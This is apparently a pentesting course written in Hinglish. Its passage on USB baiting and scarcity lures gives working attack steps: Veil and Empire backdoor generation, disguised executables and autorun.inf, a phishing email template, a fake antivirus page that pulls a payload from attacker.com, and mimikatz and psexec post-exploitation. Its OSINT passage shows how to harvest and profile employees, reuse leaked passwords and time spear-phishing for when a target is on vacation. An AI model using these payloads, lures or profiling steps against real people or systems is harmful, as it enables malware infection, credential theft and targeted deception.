Baiting: "Free gift/prize/download" - greed exploit karta hai, victim malicious file download kar leta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- 80% malware infections baiting se hote hain (free software, cracked apps)
- Scarcity urgency create karta hai without fear (positive emotion)
- USB drops (physical baiting) mein 45% success rate hai
- Combines well with other triggers (authority + scarcity = deadly combo)

### üéØ Practical Use (Asli Pentesting Mein):
- **USB Drop Attack**: Parking lot mein "Salary_2024.xlsx" USB chhod do
- **Fake Software**: "Free Premium Antivirus - Limited Time Offer"
- **Prize Scam**: "You won $1000 gift card - Claim in 24 hours"
- **Exclusive Access**: "Only 10 spots left for beta testing"

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Psychology Behind It:**

**Scarcity (Limited Availability):**
1. **Loss Aversion**: Log miss out hone se zyada darte hain
2. **Perceived Value**: Jo rare hai woh valuable lagta hai
3. **Competition**: "Dusre log le lenge" ka dar

**Baiting (Greed/Curiosity):**
1. **Reward Seeking**: Free stuff ka lalach
2. **Curiosity**: "Yeh file mein kya hai?" - open karne ka mann
3. **Risk Underestimation**: "Free hai toh kya problem hogi"

**Attack Flow:**
```
Scarcity: "Limited time offer" ‚Üí FOMO ‚Üí Quick decision ‚Üí Victim clicks
Baiting: "Free download" ‚Üí Greed ‚Üí Download malware ‚Üí System compromised
```

### üëç Pros (Fayde):
- Positive emotion use karta hai (fear nahi, excitement)
- Physical attacks mein bahut effective (USB drops)
- Low technical barrier (simple social engineering)
- High success rate (45-60% depending on bait quality)

### üëé Cons (Nuksaan):
- Obvious baits easily detected ho jate hain
- Antivirus/EDR malicious files detect kar sakte hain
- Physical baiting mein CCTV risk hai
- Requires creative thinking (boring bait = no clicks)

### ‚å®Ô∏è Zaroori Commands & Steps:

**USB Baiting Attack:**

**Step 1: Payload Creation**
```bash
# Veil se undetectable backdoor banao
veil
use evasion
use 15
set LHOST 192.168.1.10
set LPORT 443
generate

# Output: backdoor.exe
```

**Step 2: Bait File Creation**
```bash
# Tempting filenames banao
cp backdoor.exe "Salary_Hikes_2024_Confidential.exe"
cp backdoor.exe "CEO_Resignation_Letter.pdf.exe"
cp backdoor.exe "Layoff_List_Q1.xlsx.exe"

# Icon change karo (PDF/Excel icon)
# Bat to Exe Converter use karo
```

**Step 3: USB Preparation**
```bash
# USB mein autorun.inf add karo (older Windows)
nano autorun.inf

[autorun]
open=Salary_Hikes_2024_Confidential.exe
icon=excel.ico
label=HR_Documents
```

**Step 4: Physical Drop**
```
Locations:
- Company parking lot (near entrance)
- Reception desk
- Cafeteria tables
- Elevator floors
- Smoking area

Label USB: "HR Confidential" or "Finance Q4"
```

**Scarcity Email Template:**

```bash
sendemail -f hr@company.com \
-t employees@company.com \
-u "‚è∞ LAST CHANCE: Annual Bonus Survey (Closes Tonight)" \
-m "Email body..." \
-s smtp.gmail.com:587
```

**Email Body (Scarcity + Baiting):**
```
Subject: ‚è∞ LAST CHANCE: Annual Bonus Survey (Closes Tonight)

Dear Team,

This is your FINAL opportunity to participate in the annual bonus survey.

üéÅ INCENTIVE: All participants enter lucky draw for:
   - 1st Prize: $500 Amazon Gift Card
   - 2nd Prize: $250 Gift Card
   - 3rd Prize: $100 Gift Card

‚è∞ DEADLINE: Tonight 11:59 PM (Only 6 hours left!)
üë• SPOTS LEFT: 23/200 (filling fast!)

‚ö†Ô∏è Survey link will expire after deadline - no extensions.

Click here to participate: [Phishing Link]

Note: Only employees who complete survey are eligible for year-end bonus review.

HR Department
```

**Fake Software Baiting:**

```html
<!-- Phishing page: Fake antivirus download -->
<!DOCTYPE html>
<html>
<head>
  <title>Free Premium Antivirus - Limited Time Offer</title>
</head>
<body>
  <div class="banner" style="background:red; color:white; padding:20px;">
    üö® YOUR COMPUTER IS AT RISK! üö®
  </div>
  
  <h1>üõ°Ô∏è Premium Antivirus 2024 - FREE for 24 Hours Only!</h1>
  
  <div class="scarcity">
    <p>‚è∞ Offer expires in: <span id="timer">23:45:12</span></p>
    <p>üì¶ Downloads remaining: <span id="count">47</span>/1000</p>
    <p>‚≠ê 4.9/5 stars (12,847 reviews)</p>
  </div>
  
  <div class="features">
    <h3>‚úÖ What You Get (Worth $99.99):</h3>
    <ul>
      <li>Real-time virus protection</li>
      <li>Ransomware shield</li>
      <li>VPN included (Premium)</li>
      <li>Password manager</li>
      <li>24/7 support</li>
    </ul>
  </div>
  
  <button onclick="downloadMalware()" style="background:green; color:white; padding:20px; font-size:24px;">
    üéÅ DOWNLOAD FREE NOW (Limited Time)
  </button>
  
  <p style="color:red;">‚ö†Ô∏è After 24 hours: $99.99/year</p>
  
  <div class="social-proof">
    <p>üü¢ John D. downloaded 2 minutes ago</p>
    <p>üü¢ Sarah M. downloaded 5 minutes ago</p>
    <p>üü¢ Mike R. downloaded 8 minutes ago</p>
  </div>
  
  <script>
    function downloadMalware() {
      window.location.href = 'http://attacker.com/backdoor.exe';
    }
    
    // Fake countdown
    var time = 86400; // 24 hours
    setInterval(function(){
      var h = Math.floor(time/3600);
      var m = Math.floor((time%3600)/60);
      var s = time%60;
      document.getElementById('timer').innerHTML = h+':'+m+':'+s;
      time--;
    }, 1000);
    
    // Fake download counter
    var count = 47;
    setInterval(function(){
      count--;
      document.getElementById('count').innerHTML = count;
    }, 30000); // Decrease every 30 seconds
  </script>
</body>
</html>
```

### üíª Step-by-Step Example:

**Scenario: USB Drop Attack at Corporate Office**

**Step 1: Reconnaissance**
```bash
# Target company info
Company: TechCorp Inc.
Location: Building A, 5th Floor
Employees: ~200
Security: Badge access, CCTV in lobby

# Recon visit (as visitor)
- Parking lot: No CCTV
- Smoking area: Employees gather at 12 PM
- Cafeteria: Open access, crowded during lunch
```

**Step 2: Payload Creation**
```bash
# Empire stager (PowerShell)
powershell-empire client
usestager windows/launcher_bat
set Listener http
set OutFile payload.bat
execute

# Convert to EXE with tempting name
# Use Bat to Exe Converter
Input: payload.bat
Output: Q1_Bonus_Calculations.exe
Icon: Excel icon
```

**Step 3: USB Preparation**
```bash
# USB contents
USB Label: "HR_CONFIDENTIAL"

Files:
1. Q1_Bonus_Calculations.exe (backdoor)
2. Employee_List.txt (fake - adds legitimacy)
3. README.txt (social engineering)

README.txt content:
"HR Team - Please review Q1 bonus calculations.
Open Q1_Bonus_Calculations.exe to view spreadsheet.
DO NOT SHARE - Confidential information."
```

**Step 4: Physical Drop (Baiting)**
```
Time: 8:30 AM (employees arriving)
Location: Parking lot near entrance

Action:
- Drop 5 USBs near cars
- Label visible: "HR_CONFIDENTIAL"
- Walk away casually

Psychology:
- Curiosity: "HR Confidential? Bonus info?"
- Scarcity: "Yeh kisi aur ko mil gaya toh?"
- Authority: "HR ka hai, legitimate hoga"
```

**Step 5: Listener Setup**
```bash
# Empire listener already running
powershell-empire server &
powershell-empire client

listeners
# http listener active on port 8080

# Wait for connections
agents
# Monitor for new agents
```

**Step 6: Results (Real-World Stats)**
```
USBs Dropped: 5
USBs Picked: 4 (80%)
USBs Plugged In: 3 (60%)
Backdoor Executed: 2 (40%)

Timeline:
9:15 AM - First USB picked (parking lot)
9:45 AM - First connection received (Employee: John, Marketing)
10:30 AM - Second connection (Employee: Sarah, Finance)

Access Gained:
- 2 employee workstations
- Network access
- Credentials harvested
- Lateral movement possible
```

**Step 7: Post-Exploitation**
```bash
# Interact with agent
interact AGENT_NAME

# Gather info
shell whoami
shell ipconfig
shell net user

# Dump credentials
usemodule credentials/mimikatz/logonpasswords
execute

# Lateral movement
usemodule lateral_movement/invoke_psexec
set ComputerName FILE-SERVER-01
execute
```

### üí° Pro Tip / Galti:

**Pro Tip**: USB baiting mein "dual bait" strategy use karo. USB mein ek legitimate-looking PDF bhi rakho (fake salary slip) jo actually open ho jaye, aur background mein backdoor bhi run ho. Victim ko lagega "file toh open ho gayi, sab normal hai" aur woh suspicious nahi hoga. Code:
```bash
# Trojan banana (Page 32 technique)
1. Legitimate PDF: Salary_Slip.pdf
2. Backdoor: backdoor.exe
3. Combine: Salary_Slip.pdf.exe (RTL override se extension hide karo)
4. Jab victim double-click kare:
   - PDF open ho (Adobe Reader se)
   - Background mein backdoor run ho (silent)
```

**Common Mistake**: Boring bait use karna. "New_Document.exe" ya "File.exe" koi nahi kholta. Instead, context-specific bait use karo:
- Tech company: "AI_Model_Weights.zip", "Source_Code_Backup.rar"
- Finance company: "Q4_Earnings_Report.xlsx", "Audit_Results.pdf"
- Healthcare: "Patient_Records.xlsx", "Insurance_Claims.csv"
- Timing bhi matter karta hai: Tax season mein "Tax_Documents.zip", bonus season mein "Salary_Hikes.xlsx"

**Real Example**: 2018 mein security researchers ne parking lot mein 297 USBs drop kiye (labeled: "Confidential", "Salary Info", "Vacation Photos"). Result: 45% USBs plugged in within 6 hours, 20% executed files. Lesson: Human curiosity > Security training!

---

## üéì Module 1 Complete! 

Aapne successfully Module 1 ke saare topics cover kar liye:
‚úÖ 1.1: Social Engineering Kya Hai?
‚úÖ 1.2: Pentesting Phases
‚úÖ 1.3: Authority Trigger
‚úÖ 1.4: Urgency & Fear Trigger
‚úÖ 1.5: Social Proof & Liking Trigger
‚úÖ 1.6: Scarcity & Baiting Trigger

**Key Takeaways:**
- Social Engineering = Psychology + Technology
- 6 main psychological triggers sabhi attacks mein use hote hain
- Combination of triggers = Higher success rate
- Always combine with technical skills (OSINT, payload creation, etc.)

**Next Module Preview:**
Module 2 mein hum OSINT (Information Gathering) tools detail mein seekhenge:
- Maltego (Graph-based intelligence)
- theHarvester (Email/subdomain enumeration)
- Hunter.io, PhoneInfoga, Sherlock
- Google Dorking (Advanced search techniques)

Kya aap ready hain Module 2 ke liye? üöÄ



=============================================================

# üéØ Module 2: Information Gathering (OSINT)

---

## üìö Topic 2.1: OSINT Introduction

### üéØ Topic/Technique:
**OSINT (Open Source Intelligence)** - Publicly available sources se target ke baare mein information gather karna.

### ü§î Yeh Kya Hai?
OSINT ek reconnaissance technique hai jismein attacker legal aur public sources (Google, social media, public records, company websites) se target ke baare mein data collect karta hai bina directly target ko touch kiye.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Pentesting ka pehla aur sabse important phase hai
- 80% successful attacks OSINT se start hote hain
- Passive technique hai (target ko pata nahi chalta)
- Legal hai (public information use kar rahe ho)
- Attack surface identify karne mein madad karta hai

### üéØ Practical Use (Asli Pentesting Mein):
- **Email addresses** nikalna (phishing campaigns ke liye)
- **Employee names & designations** (spear phishing targets)
- **Technology stack** (vulnerabilities identify karne ke liye)
- **Phone numbers** (vishing attacks)
- **Social media profiles** (personal info for pretexting)
- **Subdomains** (hidden attack surfaces)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**OSINT Lifecycle:**
```
1. Requirements ‚Üí Kya information chahiye?
2. Collection ‚Üí Data gather karna (tools + manual)
3. Processing ‚Üí Data ko organize karna
4. Analysis ‚Üí Patterns identify karna
5. Dissemination ‚Üí Report banana
```

**Information Sources:**
- **Search Engines**: Google, Bing, DuckDuckGo
- **Social Media**: LinkedIn, Facebook, Twitter, Instagram
- **Public Records**: WHOIS, DNS records, SSL certificates
- **Company Websites**: Job postings, press releases, employee directories
- **Code Repositories**: GitHub, GitLab (leaked credentials)
- **Dark Web**: Breach databases, forums

### üëç Pros (Fayde):
- Completely passive (detection risk zero hai)
- Legal hai (public information use kar rahe ho)
- Cost-effective (free tools available hain)
- Massive information mil sakta hai (emails, phones, addresses, etc.)
- Foundation for all other attacks

### üëé Cons (Nuksaan):
- Time-consuming (manual research mein hours/days lag sakte hain)
- Information overload (irrelevant data bhi mil jata hai)
- Outdated information mil sakta hai
- Requires patience aur analytical skills

### ‚å®Ô∏è Zaroori Commands & Steps:

**Basic OSINT Commands:**

```bash
# Domain information
whois targetcompany.com
nslookup targetcompany.com
dig targetcompany.com ANY

# Email harvesting
theHarvester -d targetcompany.com -b google,bing,linkedin
theHarvester -d targetcompany.com -b all -l 500

# Subdomain enumeration
sublist3r -d targetcompany.com
amass enum -d targetcompany.com

# Social media username search
sherlock username123
sherlock --print-found username123

# Phone number OSINT
phoneinfoga scan -n +919876543210

# Google dorking
site:targetcompany.com
site:targetcompany.com filetype:pdf
site:targetcompany.com inurl:admin
site:targetcompany.com "confidential"
```

**OSINT Framework Categories:**

1. **Domain/IP Intelligence**
   - WHOIS lookup
   - DNS records
   - SSL certificate info
   - Reverse IP lookup

2. **Email Intelligence**
   - Email pattern identification
   - Email verification
   - Breach database search

3. **People Intelligence**
   - Social media profiles
   - Employment history
   - Contact information
   - Interests & hobbies

4. **Company Intelligence**
   - Technology stack
   - Employee count
   - Office locations
   - Business partners

### üíª Step-by-Step Example:

**Scenario: Complete OSINT on Target Company "TechCorp Inc."**

**Step 1: Domain Intelligence**
```bash
# Basic domain info
whois techcorp.com

Output:
Registrant: TechCorp Inc.
Email: admin@techcorp.com
Phone: +1-555-0123
Address: 123 Tech Street, San Francisco, CA
Name Servers: ns1.techcorp.com, ns2.techcorp.com

# DNS records
dig techcorp.com ANY

Output:
A record: 192.168.1.100
MX record: mail.techcorp.com
TXT record: "v=spf1 include:_spf.google.com ~all"
```

**Step 2: Subdomain Discovery**
```bash
sublist3r -d techcorp.com

Output:
www.techcorp.com
mail.techcorp.com
vpn.techcorp.com
dev.techcorp.com  ‚Üê Interesting! (development server)
staging.techcorp.com
api.techcorp.com
admin.techcorp.com  ‚Üê High-value target!
```

**Step 3: Email Harvesting**
```bash
theHarvester -d techcorp.com -b google,linkedin,bing -l 500

Output:
john.smith@techcorp.com (CEO)
sarah.jones@techcorp.com (CTO)
mike.wilson@techcorp.com (IT Manager)
lisa.brown@techcorp.com (HR Director)
... (50+ emails)

Email Pattern: firstname.lastname@techcorp.com
```

**Step 4: Employee Intelligence (LinkedIn)**
```
Manual LinkedIn Search: "TechCorp Inc."

Results:
- 200+ employees
- Key targets:
  * John Smith (CEO) - Stanford MBA
  * Sarah Jones (CTO) - MIT CS
  * Mike Wilson (IT Manager) - 5 years at company
  
Technology Stack (from job postings):
- AWS (cloud infrastructure)
- Python, Node.js (backend)
- React (frontend)
- PostgreSQL (database)
- Slack (communication)
```

**Step 5: Social Media Profiling**
```bash
# Search for IT Manager's username
sherlock mikewilson123

Output:
[+] Twitter: https://twitter.com/mikewilson123
[+] Instagram: https://instagram.com/mikewilson123
[+] GitHub: https://github.com/mikewilson123

# GitHub analysis
- Personal projects visible
- Company code? (check for leaks)
- Email in commits: mike.wilson@techcorp.com (confirmed)
```

**Step 6: Google Dorking**
```bash
# Find sensitive files
site:techcorp.com filetype:pdf "confidential"
site:techcorp.com filetype:xlsx "salary"
site:techcorp.com inurl:admin
site:techcorp.com intext:"password"

# Find employee info
site:linkedin.com "TechCorp Inc." "IT Manager"

# Find technology info
site:techcorp.com "powered by"
site:techcorp.com "Apache" OR "nginx"
```

**Step 7: Breach Database Search**
```bash
# Check if company emails in breaches
https://haveibeenpwned.com/

Search: mike.wilson@techcorp.com

Result:
‚úì Found in LinkedIn breach (2021)
‚úì Found in Dropbox breach (2012)

Leaked password: Summer2012! (old, but pattern useful)
```

**Step 8: Phone Number Intelligence**
```bash
phoneinfoga scan -n +15550123

Output:
Country: United States
Carrier: Verizon
Type: Mobile
Location: San Francisco, CA
Social Media: Found on Facebook (Mike Wilson profile)
```

**Step 9: OSINT Summary Report**

```
TARGET: TechCorp Inc.
DOMAIN: techcorp.com
IP: 192.168.1.100

KEY EMPLOYEES:
1. John Smith (CEO) - john.smith@techcorp.com
2. Sarah Jones (CTO) - sarah.jones@techcorp.com  
3. Mike Wilson (IT Manager) - mike.wilson@techcorp.com - +1-555-0123

TECHNOLOGY STACK:
- Cloud: AWS
- Backend: Python, Node.js
- Frontend: React
- Database: PostgreSQL
- Email: Google Workspace (from MX records)

ATTACK SURFACE:
- dev.techcorp.com (development server - potential vulnerabilities)
- admin.techcorp.com (admin panel - high-value target)
- vpn.techcorp.com (VPN portal - credential stuffing opportunity)

VULNERABILITIES IDENTIFIED:
- Old password pattern from breach: Summer2012!
- Development server exposed (dev.techcorp.com)
- Employee social media profiles public (social engineering vectors)

RECOMMENDED ATTACKS:
1. Spear phishing to Mike Wilson (IT Manager) - impersonate CEO
2. Credential stuffing on vpn.techcorp.com (use leaked passwords)
3. Subdomain takeover attempt on dev.techcorp.com
```

### üí° Pro Tip / Galti:

**Pro Tip**: OSINT mein "Google Dorking" sabse underrated technique hai. Simple searches se zyada, advanced operators use karo:
```
site:targetcompany.com ext:xlsx | ext:docx | ext:pdf "confidential"
site:targetcompany.com inurl:admin | inurl:login | inurl:dashboard
site:github.com "targetcompany.com" "password" | "api_key" | "secret"
```
Yeh queries leaked credentials, internal documents, aur admin panels dhundh sakti hain. Real example: Ek pentester ne `site:company.com filetype:xlsx "password"` search kiya aur use ek Excel file mili jismein 50+ employee passwords the!

**Common Mistake**: Sirf automated tools par depend karna. Tools 70% kaam karte hain, baaki 30% manual research se milta hai. Example: LinkedIn par manually scroll karo, employee posts padhho (kaun vacation par ja raha hai? Kaun frustrated hai job se?). Yeh information tools nahi de sakte lekin spear phishing mein bahut kaam aati hai. Ek employee ne post kiya "Finally going on vacation to Hawaii next week!" - perfect time for attack kyunki woh out-of-office hoga aur suspicious activity detect nahi karega!

---

## üìö Topic 2.2: Tool - Maltego (Basic Setup & Transforms)

### üéØ Topic/Technique:
**Maltego** - Graph-based OSINT tool jo relationships visualize karta hai (domain ‚Üí emails ‚Üí social media ‚Üí people).

### ü§î Yeh Kya Hai?
Maltego ek powerful GUI tool hai jo data ko graphical format mein dikhata hai. Yeh "transforms" use karta hai jo automatically information gather karte hain aur connections show karte hain. Jaise: Company ‚Üí Employees ‚Üí Email addresses ‚Üí Social media profiles.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Visual representation se complex relationships samajhna easy ho jata hai
- Automated transforms se time bachta hai (manual search ki zaroorat nahi)
- 100+ data sources integrate hain (WHOIS, DNS, social media, etc.)
- Client ko impressive reports de sakte ho (graphs dikhake)
- Hidden connections discover kar sakte ho (employee ‚Üí competitor company)

### üéØ Practical Use (Asli Pentesting Mein):
- Company infrastructure mapping (domains, IPs, servers)
- Employee network analysis (kaun kisse connected hai)
- Attack path identification (weakest link dhundhna)
- Phishing target selection (high-value employees)
- Report generation for clients

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Maltego Architecture:**
```
Entity (Starting Point) ‚Üí Transform (Data Collection) ‚Üí New Entities (Results) ‚Üí Graph
```

**Key Concepts:**
1. **Entity**: Data ka ek piece (domain, email, person, phone)
2. **Transform**: Action jo entity par run hota hai (email se person dhundhna)
3. **Graph**: Visual representation of all entities and connections
4. **Machine**: Pre-configured transform sequences (automated workflows)

**Built-in Transforms:**
- Domain ‚Üí Email addresses
- Email ‚Üí Person name
- Person ‚Üí Social media profiles
- Domain ‚Üí Subdomains
- IP ‚Üí Geolocation
- Phone ‚Üí Owner details

### üëç Pros (Fayde):
- Visual graphs samajhne mein easy hain
- Automated transforms se fast results
- Multiple data sources ek jagah (no need to switch tools)
- Collaboration features (team ke saath graphs share kar sakte ho)
- Export options (PDF, CSV, XML reports)

### üëé Cons (Nuksaan):
- Free version (Community Edition) limited hai (daily transform limit)
- Paid version expensive hai ($999/year for Classic)
- Learning curve steep hai (beginners ke liye confusing)
- Some transforms outdated hain (APIs change ho jate hain)
- Resource-intensive (slow on old computers)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation (Kali Linux):**
```bash
# Maltego pre-installed hai Kali mein
# Launch karne ke liye
maltego

# Ya Applications menu se search karo: "Maltego"
```

**First Time Setup:**
```bash
# Step 1: Maltego open karo
# Step 2: Account banao (free registration)
# Step 3: Community Edition select karo
# Step 4: Login karo
# Step 5: Transform Hub se free transforms install karo
```

**Basic Maltego Workflow:**

**1. New Graph Banao:**
```
File ‚Üí New Graph (ya Ctrl+N)
```

**2. Entity Add Karo:**
```
Left Panel ‚Üí Entity Palette ‚Üí Drag & Drop to Graph

Common Entities:
- Domain (website.com)
- Email Address (user@domain.com)
- Person (John Smith)
- Phone Number (+1234567890)
- IPv4 Address (192.168.1.1)
```

**3. Entity Properties Set Karo:**
```
Entity par click karo ‚Üí Right Panel ‚Üí Property View
Example: Domain entity mein "techcorp.com" type karo
```

**4. Transform Run Karo:**
```
Entity par Right Click ‚Üí Run Transform ‚Üí Select transform

Popular Transforms:
- "To Email Addresses [using Search Engine]"
- "To DNS Name - NS (name server)"
- "To Domains [DNS]"
- "To Person [from email address]"
- "To Phone Numbers [from search engine]"
```

**5. Run All Transforms:**
```
Entity par Right Click ‚Üí Run All Transforms
(Yeh sabhi available transforms ek saath run karega)
```

**6. Graph Save Karo:**
```
File ‚Üí Save Graph As ‚Üí filename.mtgx
```

**7. Graph Export Karo:**
```
File ‚Üí Export Graph ‚Üí PDF/Image/CSV
```

### üíª Step-by-Step Example:

**Scenario: TechCorp Inc. ki Complete OSINT Mapping**

**Step 1: Maltego Launch & Setup**
```bash
# Kali terminal mein
maltego

# Login with credentials
# Transform Hub ‚Üí Install "Paterva CTAS" (free transforms)
```

**Step 2: New Graph Create Karo**
```
File ‚Üí New Graph
Graph name: "TechCorp_OSINT_2024"
```

**Step 3: Domain Entity Add Karo**
```
Left Panel ‚Üí Infrastructure ‚Üí Domain
Drag "Domain" to center of graph
Right Panel ‚Üí Properties ‚Üí Domain Name: techcorp.com
```

**Step 4: Email Addresses Nikalo**
```
Right Click on "techcorp.com" entity
‚Üí Run Transform
‚Üí "To Email Addresses [using Search Engine]"

Wait 30 seconds...

Result: 15 email addresses appear on graph
- john.smith@techcorp.com
- sarah.jones@techcorp.com
- mike.wilson@techcorp.com
... (12 more)
```

**Step 5: Email se Person Names Nikalo**
```
Select all email entities (Ctrl+A)
Right Click ‚Üí Run Transform
‚Üí "To Person [from email address]"

Result: Person entities appear
- John Smith (CEO)
- Sarah Jones (CTO)
- Mike Wilson (IT Manager)
```

**Step 6: Person se Social Media Profiles**
```
Select "Mike Wilson" entity
Right Click ‚Üí Run Transform
‚Üí "To Social Media Profiles [using search]"

Result:
- Twitter: @mikewilson123
- LinkedIn: linkedin.com/in/mikewilson
- Facebook: facebook.com/mike.wilson.tech
```

**Step 7: Domain se Subdomains**
```
Right Click on "techcorp.com"
‚Üí Run Transform
‚Üí "To DNS Name - Subdomains [brute force]"

Result: 8 subdomains found
- www.techcorp.com
- mail.techcorp.com
- vpn.techcorp.com
- dev.techcorp.com ‚Üê Interesting!
- api.techcorp.com
- admin.techcorp.com ‚Üê High-value!
```

**Step 8: Subdomain se IP Addresses**
```
Select "dev.techcorp.com"
Right Click ‚Üí Run Transform
‚Üí "To IP Address [DNS]"

Result: 192.168.1.50 (development server IP)
```

**Step 9: IP se Geolocation**
```
Right Click on "192.168.1.50"
‚Üí Run Transform
‚Üí "To Location [from IP]"

Result:
Location: San Francisco, CA, USA
ISP: Amazon Web Services (AWS)
```

**Step 10: Graph Analysis**
```
Final Graph Structure:

techcorp.com (center)
‚îú‚îÄ‚îÄ john.smith@techcorp.com ‚Üí John Smith ‚Üí LinkedIn profile
‚îú‚îÄ‚îÄ sarah.jones@techcorp.com ‚Üí Sarah Jones ‚Üí Twitter
‚îú‚îÄ‚îÄ mike.wilson@techcorp.com ‚Üí Mike Wilson ‚Üí GitHub
‚îú‚îÄ‚îÄ www.techcorp.com ‚Üí 192.168.1.100 ‚Üí San Francisco
‚îú‚îÄ‚îÄ dev.techcorp.com ‚Üí 192.168.1.50 ‚Üí AWS (vulnerable!)
‚îî‚îÄ‚îÄ admin.techcorp.com ‚Üí 192.168.1.200 ‚Üí High-value target

Key Findings:
1. Mike Wilson has public GitHub (potential code leaks)
2. dev.techcorp.com exposed (attack surface)
3. All servers in AWS (cloud misconfig possible)
4. Email pattern confirmed: firstname.lastname@techcorp.com
```

**Step 11: Export Report**
```
File ‚Üí Export Graph ‚Üí PDF
Save as: TechCorp_OSINT_Report.pdf

Include:
- Graph screenshot
- Entity list (emails, IPs, subdomains)
- Key findings summary
```

### üí° Pro Tip / Galti:

**Pro Tip**: Maltego mein "Machines" feature use karo for automated workflows. Machines pre-configured transform sequences hain jo ek click mein complete OSINT kar dete hain:
```
Top Menu ‚Üí Machines ‚Üí "Company Stalker"
Input: techcorp.com
Click "Run"

Yeh automatically:
1. Domain info gather karega
2. Emails nikaalega
3. Social media profiles dhundhega
4. Subdomains enumerate karega
5. IP addresses resolve karega

5 minutes mein complete graph ready! Manual transforms se 1 hour bachta hai.
```

**Common Mistake**: Sabhi transforms ek saath run karna (Run All Transforms). Yeh graph ko messy bana deta hai aur irrelevant data bhi aa jata hai. Instead, selective transforms use karo:
- Pehle emails nikalo
- Phir sirf important emails (CEO, IT Manager) par person transform run karo
- Phir sirf high-value persons par social media transform

Yeh approach se clean aur focused graph banta hai. Real example: Ek beginner ne "Run All" kiya aur 500+ entities aa gaye (90% useless). Graph itna cluttered ho gaya ki kuch samajh nahi aaya. Lesson: Quality > Quantity!

---

## üìö Topic 2.3: Tool - theHarvester (Emails & Subdomains)

### üéØ Topic/Technique:
**theHarvester** - Command-line tool jo emails, subdomains, IPs, aur URLs gather karta hai multiple search engines se.

### ü§î Yeh Kya Hai?
theHarvester ek Python-based OSINT tool hai jo publicly available sources (Google, Bing, LinkedIn, etc.) se target domain ke baare mein information automatically collect karta hai. Yeh passive reconnaissance tool hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Fast aur automated (manual searching se 10x faster)
- Multiple sources ek saath query karta hai
- Email patterns identify karne mein madad karta hai
- Phishing campaigns ke liye target list banane mein useful
- Free aur open-source hai

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing target list banana (employee emails)
- Email pattern identification (firstname.lastname@domain.com)
- Subdomain discovery (hidden attack surfaces)
- Technology fingerprinting (Shodan integration)
- Breach database search (leaked credentials)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
theHarvester search engines aur public APIs ko query karta hai, results parse karta hai, aur structured format mein output deta hai. Yeh passive hai (target ko directly touch nahi karta).

**Supported Sources:**
- Search Engines: Google, Bing, Yahoo, DuckDuckGo
- Social Media: LinkedIn, Twitter
- Security: Shodan, VirusTotal, ThreatCrowd
- DNS: DNSdumpster, CertSpotter
- Others: Hunter.io, Baidu, Netcraft

### üëç Pros (Fayde):
- Completely passive (detection risk zero)
- Multiple sources ek command mein
- Fast results (seconds mein 50+ emails)
- Export options (JSON, XML, HTML)
- Regularly updated (new sources add hote rehte hain)

### üëé Cons (Nuksaan):
- API keys chahiye kuch sources ke liye (Hunter.io, Shodan)
- Rate limiting (zyada queries = IP ban)
- Outdated results mil sakte hain
- False positives (irrelevant emails bhi aa sakte hain)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Kali mein pre-installed
theHarvester -h

# Ya install karo
apt-get install theharvester
pip3 install theHarvester
```

**Basic Syntax:**
```bash
theHarvester -d <domain> -b <source> -l <limit>
```

**Common Commands:**

```bash
# Basic email harvesting (Google)
theHarvester -d company.com -b google

# Multiple sources
theHarvester -d company.com -b google,bing,linkedin

# All sources (slow but comprehensive)
theHarvester -d company.com -b all

# Limit results
theHarvester -d company.com -b google -l 500

# Save to file
theHarvester -d company.com -b all -f output.html

# Subdomain enumeration
theHarvester -d company.com -b dnsdumpster

# Shodan integration (IPs + ports)
theHarvester -d company.com -b shodan

# Virtual hosts
theHarvester -d company.com -b bing -v
```

**Advanced Usage:**

```bash
# DNS brute force
theHarvester -d company.com -b dnsdumpster -c

# Screenshot results
theHarvester -d company.com -b all -s

# Verify emails (check if valid)
theHarvester -d company.com -b hunter -v

# Export to JSON
theHarvester -d company.com -b all -f results.json
```

### üíª Step-by-Step Example:

**Scenario: TechCorp Inc. Complete Email & Subdomain Harvesting**

**Step 1: Basic Email Harvesting**
```bash
theHarvester -d techcorp.com -b google

Output:
[*] Searching in Google:
    Searching 0 results.
    Searching 100 results.
    Searching 200 results.

[*] Emails found: 15
john.smith@techcorp.com
sarah.jones@techcorp.com
mike.wilson@techcorp.com
lisa.brown@techcorp.com
tom.davis@techcorp.com
... (10 more)

[*] Hosts found: 3
www.techcorp.com
mail.techcorp.com
blog.techcorp.com
```

**Step 2: LinkedIn Employees**
```bash
theHarvester -d techcorp.com -b linkedin -l 500

Output:
[*] Searching in LinkedIn:

[*] Emails found: 25
john.smith@techcorp.com (CEO)
sarah.jones@techcorp.com (CTO)
mike.wilson@techcorp.com (IT Manager)
... (22 more)

[*] People found:
John Smith - Chief Executive Officer
Sarah Jones - Chief Technology Officer
Mike Wilson - IT Security Manager
```

**Step 3: All Sources (Comprehensive)**
```bash
theHarvester -d techcorp.com -b all -l 500

Output:
[*] Searching in Google...
[*] Searching in Bing...
[*] Searching in LinkedIn...
[*] Searching in Twitter...
[*] Searching in DNSdumpster...
[*] Searching in Shodan...

[*] Total Emails: 47
[*] Total Hosts: 12
[*] Total IPs: 5
```

**Step 4: Subdomain Discovery**
```bash
theHarvester -d techcorp.com -b dnsdumpster,certspotter

Output:
[*] Hosts found: 12
www.techcorp.com
mail.techcorp.com
vpn.techcorp.com
dev.techcorp.com ‚Üê Development server
staging.techcorp.com
api.techcorp.com
admin.techcorp.com ‚Üê Admin panel!
ftp.techcorp.com
test.techcorp.com
portal.techcorp.com
intranet.techcorp.com
webmail.techcorp.com
```

**Step 5: Shodan Integration (IPs + Services)**
```bash
theHarvester -d techcorp.com -b shodan

Output:
[*] IPs found: 5
192.168.1.100 (www.techcorp.com)
  - Port 80: Apache 2.4.41
  - Port 443: OpenSSL 1.1.1
  
192.168.1.50 (dev.techcorp.com)
  - Port 22: OpenSSH 7.9
  - Port 80: nginx 1.18.0
  - Port 3306: MySQL 5.7 ‚Üê Database exposed!

192.168.1.200 (admin.techcorp.com)
